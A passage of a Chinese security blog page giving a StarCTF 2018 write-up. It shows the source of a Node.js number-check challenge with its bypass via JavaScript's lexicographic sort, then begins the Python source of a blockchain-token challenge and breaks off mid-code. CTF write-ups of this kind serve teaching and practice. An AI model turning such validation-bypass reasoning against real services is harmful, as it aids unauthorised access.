@@ -1,0 +1,1489 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>StarCTF 2018 Writeup | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" ctf , writeup ">
+  <meta name="description" content="StarCTF 2018 Writeup | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-starctf-ctf-2018" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">StarCTF 2018 Writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web">Web</a> > 
+            
+            <a  data-rel="Web&lt;---&gt;Writeup">Writeup</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">ctf</a>
+            
+            <a class="color3">writeup</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-16 00:48:33'>2018-04-23 20:50</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-1-simpleweb"><span class="toc-text">Web 1: simpleweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-2-Smart-Contract"><span class="toc-text">Web 2: Smart? Contract</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析流程"><span class="toc-text">分析流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析代码"><span class="toc-text">分析代码</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Web-1-simpleweb"><a href="#Web-1-simpleweb" class="headerlink" title="Web 1: simpleweb"></a>Web 1: simpleweb</h3><pre><code class="javascript">var net = require(&#39;net&#39;);
+
+flag=&#39;fake_flag&#39;;
+
+var server = net.createServer(function(socket) {
+    socket.on(&#39;data&#39;, (data) =&gt; { 
+        //m = data.toString().replace(/[\n\r]*$/, &#39;&#39;);
+        ok = true;
+        arr = data.toString().split(&#39; &#39;);
+        arr = arr.map(Number);
+        if (arr.length != 5) 
+            ok = false;
+        arr1 = arr.slice(0);
+        arr1.sort();
+        for (var i=0; i&lt;4; i++)
+            if (arr1[i+1] == arr1[i] || arr[i] &lt; 0 || arr1[i+1] &gt; 127)
+                ok = false;
+        arr2 = []
+        for (var i=0; i&lt;4; i++)
+            arr2.push(arr1[i] + arr1[i+1]);
+        val = 0;
+        for (var i=0; i&lt;4; i++)
+            val = val * 0x100 + arr2[i];
+        if (val != 0x23332333)
+            ok = false;
+        if (ok)
+            socket.write(flag+&#39;\n&#39;);
+        else
+            socket.write(&#39;nope\n&#39;);
+    });
+    //socket.write(&#39;Echo server\r\n&#39;);
+    //socket.pipe(socket);
+});
+
+HOST = &#39;0.0.0.0&#39;
+PORT = 23333
+
+server.listen(PORT, HOST);</code></pre>
+<p>非常简短的一段js代码，</p>
+<pre><code>分析下流程
+(((a * 256 + b ) * 256 + c) *256 + d) = 0x23332333
+
+a0+a1=35
+a1+a2=51
+a2+a3=35
+a3+a4=51
+凑，因为sort的原因
+a0=15
+a1=20
+a2=31
+a3=4
+a4=47</code></pre><p>主要可能引起误解的是这里的<code>sort</code>函数是按照字典序排序的</p>
+<p>如：</p>
+<pre><code class="javascript">&gt;&gt; [8,12,90].sort()
+[12,8,90]</code></pre>
+<h3 id="Web-2-Smart-Contract"><a href="#Web-2-Smart-Contract" class="headerlink" title="Web 2: Smart? Contract"></a>Web 2: Smart? Contract</h3><blockquote>
+<p>​                                </p>
+<p>Yet another blockchain challenge with tokens in the smart contract. Be careful that the blockchain is stored in the cookie and a browser might ignore set-cookie header if it is too long, which prevents the blockchain being updated. So send the requests using scripts.</p>
+<p><a href="http://47.75.9.127:10012/6af948d659f0b7c5d3950a/" target="_blank" rel="noopener">http://47.75.9.127:10012/6af948d659f0b7c5d3950a/</a></p>
+</blockquote>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+# written in python 2.7
+__author__ = &#39;garzon&#39;
+
+import pickle
+import hashlib, json, rsa, uuid, os
+from flask import Flask, session, redirect, url_for, escape, request
+
+app = Flask(__name__)
+app.secret_key = &#39;*********************&#39;
+url_prefix = &#39;/6af948d659f0b7c5d3950a&#39;
+
+def FLAG():
+    return &#39;Here is your flag: *ctf{******************}&#39;
+
+def hash(x):
+    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
+
+def hash_reducer(x, y):
+    return hash(hash(x)+hash(y))
+
+def has_attrs(d, attrs):
+    if type(d) != type({}): raise Exception(&quot;Input should be a dict/JSON&quot;)
+    for attr in attrs:
+        if attr not in d:
+            raise Exception(&quot;{} should be presented in the input&quot;.format(attr))
+
+EMPTY_HASH = &#39;0&#39;*64
+
+def addr_to_pubkey(address):
+    return rsa.PublicKey(int(address, 16), 65537)
+
+def pubkey_to_address(pubkey):
+    assert pubkey.e == 65537
+    hexed = hex(pubkey.n)
+    if hexed.endswith(&#39;L&#39;): hexed = hexed[:-1]
+    if hexed.startswith(&#39;0x&#39;): hexed = hexed[2:]
+    return hexed
+
+def gen_addr_key_pair():
+    pubkey, privkey = rsa.newkeys(384)
+    return pubkey_to_address(pubkey), privkey
+
+bank_address, bank_privkey = gen_addr_key_pair()
+hacker_address, hacker_privkey = gen_addr_key_pair()
+
+def sign_input_utxo(input_utxo_id, privkey):
+    return rsa.sign(input_utxo_id, privkey, &#39;SHA-1&#39;).encode(&#39;hex&#39;)
+
+def hash_utxo(utxo):
+    return reduce(hash_reducer, [utxo[&#39;id&#39;], utxo[&#39;addr&#39;], str(utxo[&#39;amount&#39;])])
+
+def create_output_utxo(addr_to, amount):
+    utxo = {&#39;id&#39;: str(uuid.uuid4()), &#39;addr&#39;: addr_to, &#39;amount&#39;: amount}
+    utxo[&#39;hash&#39;] = hash_utxo(utxo)
+    return utxo
+
